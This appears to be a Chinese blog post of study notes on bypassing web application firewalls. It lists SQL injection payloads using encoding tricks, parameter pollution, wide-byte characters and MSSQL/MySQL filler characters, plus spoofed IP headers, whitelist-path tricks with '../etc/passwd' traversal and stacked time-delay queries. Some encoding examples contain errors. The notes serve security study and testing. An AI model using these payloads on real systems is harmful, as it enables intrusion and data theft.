+    <title>waf bypass/waf bypass技巧</title>
+    <url>/2020/12/05/waf%20bypass/waf%20bypass%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[<h1 id="Waf-Bypass技巧"><a href="#Waf-Bypass技巧" class="headerlink" title="Waf Bypass技巧"></a>Waf Bypass技巧</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>​    实际生产环境中即使存在版本的漏洞但是由于waf的存在可能导致exp无法在服务器内部执行，所以根据各种各样的环境情况需要具体分析，具体fuzz。很早就想展开这个系列，快点学习！ 一下主要是在看wafbypass公众号上学习的整理笔记。</p>
+<p>waf防护一般有：云waf，硬件waf，软件waf等。</p>
+<h2 id="一、利用服务器特性"><a href="#一、利用服务器特性" class="headerlink" title="一、利用服务器特性"></a>一、利用服务器特性</h2><p>主要是利用服务器端对一些特殊字符或者特服字符组合的特性去绕过解析</p>
+<h3 id="1、-特性（ASP-IIS）"><a href="#1、-特性（ASP-IIS）" class="headerlink" title="1、%特性（ASP+IIS）"></a>1、%特性（ASP+IIS）</h3><p>在该环境下当们我输入s%elect的时候，解析出来的结果为select。</p>
+<p>猜测可能是iis下asp.dll解析时候的问题，aspx+iis的环境就没有这个特性。</p>
+<h3 id="2、-u特性（asp-iis和aspx-iis）"><a href="#2、-u特性（asp-iis和aspx-iis）" class="headerlink" title="2、%u特性（asp+iis和aspx+iis）"></a>2、%u特性（asp+iis和aspx+iis）</h3><p>iis服务器支持对unicode的解析。</p>
+<p>对于select中的字符进行unicode编码：s%u006c%u0006ect ，这种字符在IIS接收到之后会被转换为select</p>
+<h3 id="3、另类-u特性（ASP-IIS）"><a href="#3、另类-u特性（ASP-IIS）" class="headerlink" title="3、另类%u特性（ASP+IIS）"></a>3、另类%u特性（ASP+IIS）</h3><p>利用的是unicode在iis解析之后会被转换成multibyte（多字符集，另一种编码方式，为了解决各国之间编码有重叠），</p>
+<p>多个widechar可能转化为一个字符</p>
+<p>s%u0065lect-&gt;select s%u00f0lect-&gt;select </p>
+<h3 id="4、apache畸形method"><a href="#4、apache畸形method" class="headerlink" title="4、apache畸形method"></a>4、apache畸形method</h3><p>在GET请求中，GET可以替换为任意参数名字，不影响apahce接收参数id=？。</p>
+<p>比如将GET请求换成ABC</p>
+<h2 id="二、应用层特性"><a href="#二、应用层特性" class="headerlink" title="二、应用层特性"></a>二、应用层特性</h2><h3 id="1、大小写-关键词的替换。"><a href="#1、大小写-关键词的替换。" class="headerlink" title="1、大小写/关键词的替换。"></a>1、大小写/关键词的替换。</h3><p>列举的可以很多去拓展。</p>
+<h3 id="2、双重url编码"><a href="#2、双重url编码" class="headerlink" title="2、双重url编码"></a>2、双重url编码</h3><p>默认在代码层面会做一次url解码，传输的时候也做了一次解码。</p>
+<h3 id="3、变更请求方式"><a href="#3、变更请求方式" class="headerlink" title="3、变更请求方式"></a>3、变更请求方式</h3><p>这里在我前一节http编码传输绕过一节中有提及过，自定义boundary传输绕过。</p>
+<h3 id="4、HPP参数污染-重点"><a href="#4、HPP参数污染-重点" class="headerlink" title="4、HPP参数污染(重点)"></a>4、HPP参数污染(重点)</h3><p>类似?id=1&amp;id=2&amp;id=3的形式，此种形式在获取id值的时候不同的web技术获取的值是不一样的。</p>
+<p>假设提交的参数即为：</p>
+<p>id=1&amp;id=2&amp;id=3 </p>
+<p>得到的结果： </p>
+<p>Asp.net + iis：id=1,2,3 </p>
+<p>Asp + iis：id=1,2,3 </p>
+<p>Php + apache：id=3</p>
+<p>多种变形：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MSSQL: </span><br><span class="line">大小写+参数污染：?id&#x3D;1 UNION&#x2F;*&amp;ID&#x3D;*&#x2F;SELECT 1,2&#x2F;*&amp;Id&#x3D;*&#x2F;FROM ADMIN </span><br><span class="line"></span><br><span class="line">GET+POST形式: </span><br><span class="line">http:&#x2F;&#x2F;192.168.125.140&#x2F;test&#x2F;sql.aspx?id&#x3D;1 union&#x2F;* </span><br><span class="line">post: id&#x3D;2*&#x2F;select null,null,null </span><br><span class="line"></span><br><span class="line">利用逗号：?id&#x3D;1 union select 1&amp;id&#x3D;2&amp;id&#x3D;3&amp;id&#x3D;4 from admin--（无逗号形式） </span><br><span class="line">?a&#x3D;1+union&#x2F;*&amp;b&#x3D;*&#x2F;select+1,pass&#x2F;*&amp;c&#x3D;*&#x2F;from+users--(分割参数注入) </span><br><span class="line"></span><br><span class="line">无效参数形式： ?a&#x3D;&#x2F;*&amp;sql&#x3D;xxx&amp;b&#x3D;*&#x2F; </span><br><span class="line">备注：a,b为无效参数，让waf误以为我们输入的语句是在注释符里面执行的所以就不拦截</span><br><span class="line"></span><br><span class="line">溢出形式：?id&#x3D;1&#x2F;*&amp;id&#x3D;*&#x2F;&#x2F;*&amp;id&#x3D;*&#x2F;&#x2F;*......&amp;id&#x3D;*&#x2F;&#x2F;*&amp;id&#x3D;*&#x2F; union select null,system_user,null from INFORMATION_SCHEMA.schemata </span><br><span class="line">Mysql： ?id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;1&amp;id&#x3D;….. &amp;id&#x3D;1 union select 1,2 from admin</span><br><span class="line"></span><br><span class="line">在这里额外提一句，对单个无效参数的溢出绕waf。</span><br><span class="line">a&#x3D;600w个a&amp;id&#x3D;...这里适用于post请求，因为要发很多个包。</span><br></pre></td></tr></table></figure>
+
+<h3 id="5、宽字节（利用度不高）"><a href="#5、宽字节（利用度不高）" class="headerlink" title="5、宽字节（利用度不高）"></a>5、宽字节（利用度不高）</h3><p><strong>基本概念：</strong></p>
+<p>宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节</p>
+<p><strong>利用情况：</strong></p>
+<p>设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入，编码转换从而导致的注入漏洞。</p>
+<p><strong>例子：</strong></p>
+<p>?id=%df%27</p>
+<p>这时,假如我们现在使用的是<code>addslashes</code>来过滤,那么就会发生如下的转换过程<br>例子：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%df%27&#x3D;&#x3D;&#x3D;(addslashes)&#x3D;&#x3D;&#x3D;&gt;%df%5c%27&#x3D;&#x3D;&#x3D;(数据库GBK)&#x3D;&#x3D;&#x3D;&gt;運&#39;</span><br></pre></td></tr></table></figure>
+
+<p><strong>宽字节关键字对照表</strong>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union &#x3D; uю%69яю这里把i不用宽字节 直接url编码 其他的字符都用对应的宽字节 </span><br><span class="line"></span><br><span class="line">select &#x3D; こхlх%уt &#x2F;&#x2F;t不编码 其他的都宽字节 中间插上% </span><br><span class="line"></span><br><span class="line">from &#x3D; цR%яэ &#x2F;&#x2F;宽字节+% </span><br><span class="line"></span><br><span class="line">空格&#x3D;%20&#x3D;%ва &#x2F;&#x2F;в是2的款字符 а是0的宽字符 </span><br><span class="line"></span><br><span class="line">, &#x3D; Ь &#x2F;&#x2F;,号的宽字节</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="三、WAF层特性"><a href="#三、WAF层特性" class="headerlink" title="三、WAF层特性"></a>三、WAF层特性</h2><h3 id="1、逻辑问题"><a href="#1、逻辑问题" class="headerlink" title="1、逻辑问题"></a>1、逻辑问题</h3><p>3和4两种可利用也不高。</p>
+<p>1、云waf保护，比如绕过cdn，直接对真实的ip进行访问绕过。</p>
+<p>2、没做http到https的跳转，导致只针对https的防护在访问http服务时不起作用。</p>
+<p>3、如果针对get参数过滤，如果同时提交get和post，忽略了post参数，绕过。</p>
+<p>4、特殊符号 %00截断。</p>
+<h3 id="2、性能问题"><a href="#2、性能问题" class="headerlink" title="2、性能问题"></a>2、性能问题</h3><p>1、设计WAF系统时，考虑自身性能问题，当数据量达到一定层级，不检测这部分数据。①只要不断的填充数据，当数据达到一定数目之后，恶意代码就不会被检测了。②提交前100个无效参数</p>
+<p>比如文件上传异常的检测看看有没有特征值进行匹配，因为一般现在的waf是根据正则表达式进行匹配的。但是因为性能设定了检测特定数量的字符时，只要填充无效字符避过检测即可。</p>
+<p>2、不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度就会引发bug，从而实现绕过。</p>
+<p>3、多次重复提交同一个请求，有些通过了WAF，有些被WAF所拦截了，应该性能问题导致部分请求bypass。</p>
+<h3 id="3、白名单"><a href="#3、白名单" class="headerlink" title="3、白名单"></a>3、白名单</h3><p><strong>1、IP白名单</strong></p>
+<p>从网络层获取的ip，这种一般伪造不来，如果是应用层的获取的IP，这样就可能存在伪造白名单IP造成bypass。</p>
+<p>测试方法：修改http的header来bypass waf</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-forwarded-for </span><br><span class="line"></span><br><span class="line">X-remote-IP </span><br><span class="line"></span><br><span class="line">X-originating-IP </span><br><span class="line"></span><br><span class="line">x-remote-addr </span><br><span class="line"></span><br><span class="line">X-Real-ip</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、静态资源</strong></p>
+<p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制，waf为了检测效率，不去检测这样一些静态文件名后缀的请求。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.9.9.201&#x2F;sql.php&#x2F;1.js?id&#x3D;1 </span><br><span class="line">备注：Aspx&#x2F;php只识别到前面的.aspx&#x2F;.php 后面基本不识别</span><br></pre></td></tr></table></figure>
+
+<p><strong>3、url白名单</strong></p>
+<p>为了防止误拦，部分waf内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.9.9.201&#x2F;sql.php&#x2F;admin.php?id&#x3D;1 </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.9.9.201&#x2F;sql.php?a&#x3D;&#x2F;manage&#x2F;&amp;b&#x3D;..&#x2F;etc&#x2F;passwd </span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.9.9.201&#x2F;..&#x2F;..&#x2F;..&#x2F;manage&#x2F;..&#x2F;sql.asp?id&#x3D;2</span><br></pre></td></tr></table></figure>
+
+<p>waf通过/manage/“进行比较，只要uri中存在/manage/就作为白名单不进行检测，这样我们可以通过/sql.php?</p>
+<p>a=/manage/&amp;b=../etc/passwd 绕过防御规则。</p>
+<p><strong>4、爬虫白名单</strong></p>
+<p>部分waf有提供爬虫白名单的功能，识别爬虫的技术一般有两种：</p>
+<p>1、 根据User-Agent 2、通过行为来判断</p>
+<h2 id="四、数据库特性"><a href="#四、数据库特性" class="headerlink" title="四、数据库特性"></a>四、数据库特性</h2><h3 id="1、Mysql数据库特性"><a href="#1、Mysql数据库特性" class="headerlink" title="1、Mysql数据库特性"></a>1、Mysql数据库特性</h3><p>利用一些数据库特性来进行WAF绕过。在Mysql中，比如可以这样：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">内联注释： &#x2F;*!12345union*&#x2F;select </span><br><span class="line">Mysql黑魔法: select&#123;x user&#125;from&#123;x mysql.user&#125;; </span><br><span class="line">换行符绕过:%23%0a、%2d%2d%0a    %23 # ; %2d -</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h4><p>常见有5个位置即：select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,<strong>user()</strong>【位置四】from【位置五】admin</p>
+<h3 id="2、-SQLServer数据库特性"><a href="#2、-SQLServer数据库特性" class="headerlink" title="2、 SQLServer数据库特性"></a>2、 SQLServer数据库特性</h3><p>利用一些数据库特性来进行WAF绕过。在MSSQL中，比如可以这样：</p>
+<p>浮点数形式：id=1.1union select </p>
+<p>科学计数法形式：id=1e0union select </p>
+<p>但其实还可以这样子：id=1.eunion select</p>
+<p>通过1.e这样的形式，我曾用它绕过了D盾的SQL注入防护，通过简单的Fuzz，我们来一起探索一下MSsql特性。</p>
+<h4 id="0x02-特性"><a href="#0x02-特性" class="headerlink" title="0x02 特性"></a>0x02 特性</h4><p>（1）空白字符</p>
+<p>Mssql可以利用的空白字符（00-20）：</p>
+<p>01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F, </p>
+<p>20</p>
+<p>（2）注释符号</p>
+<p>Mssql也可以使用注释符号 /**/     %2f%2a%2a%2f</p>
+<p>（3）浮点数</p>
+<p>select * from admin where id=1.1union select 1,’2’,db_name() from admin</p>
+<p>（4）1E0的形式：</p>
+<p>select * from admin where id=1e0union select 1,’2’,db_name() from admin</p>
+<p>（5）运算符</p>
+<p>包括加(+)、减(-)、乘(*)、除(/)、求于(%)、位与（&amp;）、位或（|）、位异或（^）</p>
+<p>select username,password,id from admin where id=1-1union select ‘1’,system_user,3 from admin</p>
+<p>select username,password,id from admin where id=1e-union select ‘1’,system_user,3 from admin</p>
+<p>（6）小区别：</p>
+<p>ASPX：[0x00-0x20]、ox2e、[0x30-0x39]、ox45、ox65、[0x80-0xffff]、运算符</p>
+<p>ASP   :  [0x01-0x20]、ox2e、[0x30-0x39]、ox45、ox65、运算符</p>
+<p>单引号：select username,password,id from admin where id=1 and ‘1’like’1’union select null,null,null</p>
+<p>（7）其他符号</p>
+<h4 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h4><p>常见有5个位置即：select * from admin where id=1【位置一】union【位置二】select【位置三】1,2,<strong>db_name()</strong>【位置四】from【位置五】admin</p>
+<p><strong>位置一（参数和union）：</strong></p>
+<p>方式1-6填充</p>
+<p><strong>位置二（union与select）</strong></p>
+<p>方式1-2、7填充</p>
+<p>： %3a 冒号</p>
+<p>select * from admin where id=1 union:select 1,’2’,db_name() from:admin</p>
+<p>ASPX：[0x00-0x20]、0x3a、[0x80-0xffff]要组合前面的两个才能执行，如%3a%a0、%a0%0a</p>
+<p>ASP   :  [0x01-0x20] 、0x3a</p>
+<p><strong>位置三（select和查询参数）：</strong></p>
+<p>方式1-2、7</p>
+<p>（7）其他符号</p>
+<p>%2b + select * from admin where id=1 union select+1,’2’,db_name() from admin</p>
+<p>%2d - select * from admin where id=1 union select-1,’2’,db_name() from admin</p>
+<p>%2e . select * from admin where id=1 union select.1,’2’,db_name() from admin</p>
+<p>%3a : select * from admin where id=1 union select:1,’2’,db_name() from admin</p>
+<p>%7e ~ select * from admin where id=1 union select~1,’2’,db_name() from admin</p>
+<p><strong>位置四：查询参数和from</strong></p>
+<p>方式1-2、7</p>
+<p>（7）其他符号</p>
+<p>ASP: [0x01-0x20]、0x2e、[0x30-0x39]、0x45、0x65、[0x80-0xffff]</p>
+<p>ASPX：[0x00-0x20]、0x2e、[0x30-0x39]、0x45、0x65、</p>
+<p>id=1%20union%20select%201,’2’,db_name()%80from%20admin</p>
+<p>db_name与()中间 %00-%20 %80-%ffff填充</p>
+<p>id=1 union select 1,’2’,db_name+() from admin</p>
+<p><strong>位置五：from后面的位置</strong></p>
+<p>方式1-2、7</p>
+<p>（7）其他符号</p>
+<p>： %3a select * from admin where id=1 union:select 1,’2’,db_name() from:admin</p>
+<p>. %2e select * from admin where id=1 union select 1,’2’,db_name() from.information_schema.SCHEMATA</p>
+<p>ASPX： [0x00-0x20]、0x2e、0x3a、[0x80-0xffff]</p>
+<p>ASP  ： [0x01-0x20]、0x2e、0x3a</p>
+<h4 id="0x03-常见函数"><a href="#0x03-常见函数" class="headerlink" title="0x03 常见函数"></a>0x03 常见函数</h4><p><strong>类型一、字符串截取函数</strong></p>
+<p>Substring(@@version,1,1)</p>
+<p>Left(@@version,1)</p>
+<p>Right(@@version,1)</p>
+<p>charindex(‘test’,db_name())</p>
+<p><strong>类型二：字符串转换函数</strong></p>
+<p>Ascii(‘a’)</p>
+<p>Char(‘97’) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</p>
+<p><strong>类型三：其他方式</strong></p>
+<p>利用存储过程</p>
+<p>mssql的存储过程定义为：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;Declare @s varchar(5000) &#96;&#96;&#x2F;&#x2F;申明变量@s 类型为varchar(5000)&#96;&#96;Set @ &#96;&#96;&#x2F;&#x2F;给@s变量赋值 &#96;&#96;Exec(@s) &#96;&#96;&#x2F;&#x2F;执行@s&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>id=1;Exec(‘WA’+’ITFOR DELAY ‘’0:0:5’’’)</p>
+<p>id=1;declare @test nvarchar(50);set @test=’wait’+’for delay ‘’0:0:5’’’;exec sp_executesql @test</p>
+<h4 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><p>1、首先填充方式：MSSQL可以看出来<strong>%00-%20的填充符号</strong>、<strong>注释符号</strong>、<strong>特殊符号交集</strong>在这些中间是通用的，先fuzz这些通用符号（00-20,2a,2f,2e,3a），如果都不行，那么ASP可能首先没办法绕过（因为位置二的关系）。aspx再针对每个位置去fuzz。</p>
 ]]></content>
   </entry>
 </search>
